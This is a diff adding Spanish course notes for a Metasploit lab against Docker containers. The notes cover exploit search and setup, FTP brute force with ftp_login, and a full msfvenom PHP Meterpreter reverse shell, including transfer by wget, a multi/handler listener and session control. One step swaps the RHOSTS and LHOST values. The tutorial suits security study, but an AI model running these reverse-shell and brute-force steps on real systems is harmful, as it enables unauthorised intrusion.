@@ -934,3 +934,93 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 - Ver tema 7 de teoría y usar esos comandos.
 
 ---
+# Lab12 ⚱️
+
+## Meterpreter para explotación (System Services)
+
+### Iniciar MSF
+- Para iniciar Metasploit:
+	- Iniciar base de datos: `sudo service postgresql start`
+	- Iniciar msf:  `sudo msfdb init`
+	- Arranca la consola de MSF: `msfconsole -q`
+
+### Uso básico de MSF
+- Una vez arrancado `msf` debemos asegurarnos de que funciona bien. Para ello, escribimos `db_status` y debemos ver el siguiente mensaje:
+![[Pasted image 20230601114015.png]]
+- Ahora podemos empezar a organizar nuestras actividades usando los *workspaces*. Esto nos da la capacidad de guardar escaneos a diferentes **ubicaciones/redes/subredes**. 
+- Si usamos el comando `workspace` desde **msfconsole** se mostrarán los espacios de trabajo que existen actualmente 
+![[Pasted image 20230601114218.png]]
+- Para crear un nuevo workspace: `workspace -a <nombre>`
+- Para eliminar un workspace: `workspace -d <nombre>`
+- Para cambiar de workspace: `workspace <nombre>`
+
+### Entender la cadena típica de eventos de un exploit
+- Cheatsheet de **Metasploit**:
+![[Pasted image 20230601114515.png]]
+
+### Encontrar un exploit que vayamos a usar
+- Primero realizaremos un escaneo con **Nmap** independiente o bien con el nmap integrado de **metasploit**. El objetivo es buscar exploits aplicables a los servicios y sus versiones concretas encontrados en la base de datos de **Metasploit**. Esta base de datos se puede consultar aquí: https://www.rapid7.com/db/?type=metasploit. También puedes agregar exploits de **searchsploit** a MSF.
+- Para usar nmap de Metasploit: `db_nmap -sV <ip>`
+- Una vez tengas los servicios y versiones, busca en la base de datos CVE (http://www.cvedetails.com/) los exploits disponibles para los servicios que encontraste
+- Localizar más exploits en: http://www.exploit-db.com/
+- Ahora buscamos el exploit en Metasploit con: `search <palabras clave>`
+![[Pasted image 20230601115634.png]]
+![[Pasted image 20230601120514.png]]
+
+### Ejecución de un exploit
+- Una vez que lo hemos encontrado, usaremos el siguiente comando: `use <exploit> - set payload <payload> - show options - set options <...> - exploit`
+- Para este caso concreto, necesitaremos configurar los parámetros del exploit:
+	- Payload:
+		- Consulta los payloads disponibles para un exploit con `show payloads`
+		- Como hay muchas opciones disponibles y nosotros queremos una conexión TCP inversa para evitar firewalls, restringimos la búsqueda con: `search payload/linux -t reverse`
+		- Una vez aquí debemos elegir el nombre completo del payload a aplicar. Para decidir cuál usar:
+			- Tenemos un sistema de destino Linux
+			- Vamos a usar una conexión TCP inversa (reverse shell)
+			- Necesitamos elegir entre un Meterpreter o un shell estándar (mejor probar Meterpreter)
+			- Se trata de una arquitectura x64
+			- Luego podemos elegir entre un **Stager** o un payload inline (**stageless**). (en Docker el segundo funciona mejor)
+			- Elige el payload que cumpla con estas condiciones con: `set payload <nombre>`![[Pasted image 20230601120455.png]]![[Pasted image 20230601120651.png]]
+	- Resto de parámetros:
+		- Una vez elegido el payload, consulta la información detallada del exploit con `info <nombre_exploit>` para ver sus opciones y resto de los parámetros
+		- **NOTA**: también se puede usar el comando `options` y verlo manualmente ![[Pasted image 20230601120926.png]]
+		- Vemos que nos falta por configurar: RHOSTS y LHOST. Los configuramos y ejecutamos el exploit con: `set RHOSTS <IP_ATTACKER>` Y `set LHOST <IP_OBJETIVO>` ![[Pasted image 20230601121150.png]]
+- Lamentablemente, parece no ser vulnerable :(
+![[Pasted image 20230601121745.png]]
+
+### Uso de módulos auxiliares de MSF
+- Vamos a hacer fuerza bruta a un servidor FTP presente en el contenedor de Ubuntu.
+- Para ello:
+	- El módulo auxiliar se denomina `ftp_login`
+	- Lo usamos: `use <nombre>` ![[Pasted image 20230601122121.png]]
+	- Da permisos de lectura para todos al archivo `/wordlist/2020mostcommon.txt`
+	- Establece las opciones adecuadas para lanzar el exploit ![[Pasted image 20230601122600.png]] ![[Pasted image 20230601122722.png]]
+
+## Payloads con msfvenom y multi/handler
+
+- Para crear un payload personalizado para tratar de explotar una página web vulnerable
+- Cheatsheet msfvenom:
+![[Untitled.png]]
+
+- El **tool msfvenom** es una aplicación que genera payloads en diferentes lenguajes de programación con diversos efectos maliciosos. Uno de los más típicos es ejecutar un reverse shell de Meterpreter en un sistema infectado
+- Vamos a probar esto:
+	- Inicia sesión en el contenedor de ubuntu como usuario sin privilegios (**testUser**)
+	- El contenedor de escalada de privilegios Ubuntu puede ejecutar páginas web PHP con `php <fichero_php>` y cualquier usuario puede escribir páginas web en el directorio por defecto `/var/www/html`
+	- El contenedor Ubuntu está en una IP fija
+	- Creamos un payload de Meterpreter reverse shell con PHP (más info en: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/): `msfvenom -p php/meterpreter_reverse_tcp LHOST=<tu dirección IP> LPORT=<tu puerto> -f raw > shell.php` ![[Pasted image 20230601124144.png]]
+	- Ahora, para transferirlo a la máquina objetivo, creamos un servidor de python para leer archivos en un puerto determinado con: `python3 -m http.server <port>` ![[Pasted image 20230601124901.png]]
+	- Ahora transferimos el archivo con: `wget http://<ip>:<port>/<file>` ![[Pasted image 20230601130749.png]]
+	- Como el payload no se ejecutará dentro de msf, sino en la máquina remota, crea un payload listener `multi/handler` de la siguiente forma (usa un Stageless porque es un contenedor):
+````bash
+use exploit/multi/handler
+set PAYLOAD php/meterpreter_reverse_tcp
+set LHOST 172.12.0.2  
+set LPORT 4444
+````
+- Ejecuta el exploit en segundo plano: `exploit -j`
+- Ahora ejecutamos el shell.php en la máquina víctima: `php -f shell.php`
+- Se nos crea una sesión: ![[Pasted image 20230601131210.png]]
+- Para ver las sesiones activas: `sessions -l` ![[Pasted image 20230601131237.png]]
+- Para iniciar sesión en una: `sessions -i <ID_SESSION>` ![[Pasted image 20230601131435.png]]
+- Ahora ya podemos ejecutar comandos como en un shell normal: ![[Pasted image 20230601131513.png]] ![[Pasted image 20230601131609.png]]
+
+---
